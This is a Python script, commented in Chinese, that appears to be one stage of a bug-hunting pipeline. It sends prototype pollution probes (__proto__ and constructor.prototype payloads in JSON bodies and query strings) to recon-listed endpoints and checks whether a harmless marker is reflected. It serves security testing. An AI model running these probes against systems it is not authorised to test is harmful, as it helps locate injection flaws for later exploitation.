# -*- coding: utf-8 -*-
"""hunt-prototype-pollution hunt 阶段：对入口发污染探针，观测探针属性是否被反射。

判活：污染 huntpp 后，若回显端点/同接口返回里出现 huntpp 默认值 → 疑似全局污染。
默认只注无害探针属性；gadget 放大在 validate 阶段按 scope 做。

用法:
  python hunt_protopollution.py --input recon/endpoints.json --output candidates.json
      [--probe-url <污染后请求的回显端点>] [--dry-run]
"""
import argparse
import json
import os
import subprocess
import sys
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import log, load_json, save_json  # noqa: E402

MARK = "huntpp_" + "9f3a2b"


def json_vectors():
    return [
        ("json-proto", {"__proto__": {MARK: "polluted"}}),
        ("json-ctor", {"constructor": {"prototype": {MARK: "polluted"}}}),
    ]


def query_vectors():
    return [
        ("qs-proto-bracket", "__proto__[%s]=polluted" % MARK),
        ("qs-proto-dot", "__proto__.%s=polluted" % MARK),
        ("qs-ctor", "constructor[prototype][%s]=polluted" % MARK),
    ]


def curl_json(url, body, max_time=8):
    try:
        p = subprocess.run(["curl", "-sS", "-i", "--max-time", str(max_time),
                            "-H", "Content-Type: application/json",
                            "-X", "POST", "--data", json.dumps(body), url],
                           capture_output=True, text=True, timeout=max_time + 3)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR:%s" % e


def curl_get(url, max_time=8):
    try:
        p = subprocess.run(["curl", "-sS", "-i", "--max-time", str(max_time), url],
                           capture_output=True, text=True, timeout=max_time + 3)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR:%s" % e


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--input", required=True)
    ap.add_argument("--output", required=True)
    ap.add_argument("--probe-url", default="", help="污染后请求它看默认值是否被改；缺省则复用入口 GET")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    data = load_json(args.input)
    if not data:
        sys.exit("读不到 %s，先跑 recon.sh" % args.input)
    eps = [e for e in data.get("endpoints", []) if e.get("controllable")]
    if not eps:
        eps = [{"url": data.get("target")}]
    cands = []
    for ep in eps:
        url = ep.get("url") or data.get("target")
        # JSON body 向量
        for name, body in json_vectors():
            if args.dry_run:
                print("[dry-run] JSON %s -> %s : %s" % (name, url, json.dumps(body))); continue
            curl_json(url, body)
            probe = curl_get(args.probe_url or url)
            hit = MARK in probe
            cands.append({"endpoint": url, "param": "<json body>", "family": name,
                          "vector": json.dumps(body, ensure_ascii=False),
                          "signal": (["探针属性被反射(疑似全局污染)"] if hit else ["未反射"]),
                          "suspected": hit})
        # query 向量
        for name, q in query_vectors():
            probe_url = "%s%s%s" % (url, "&" if "?" in url else "?", q)
            if args.dry_run:
                print("[dry-run] QS %s -> %s" % (name, probe_url)); continue
            curl_get(probe_url)
            probe = curl_get(args.probe_url or url)
            hit = MARK in probe
            cands.append({"endpoint": url, "param": ep.get("param"), "family": name,
                          "vector": q, "probe_url": probe_url,
                          "signal": (["探针属性被反射(疑似全局污染)"] if hit else ["未反射"]),
                          "suspected": hit})
    if args.dry_run:
        return
    save_json(args.output, {"target": data.get("target"), "marker": MARK, "candidates": cands})
    log("污染探针候选 %d（%d 反射命中）-> %s（gadget 放大按 scope 手工做）"
        % (len(cands), sum(1 for c in cands if c["suspected"]), args.output))


if __name__ == "__main__":
    main()
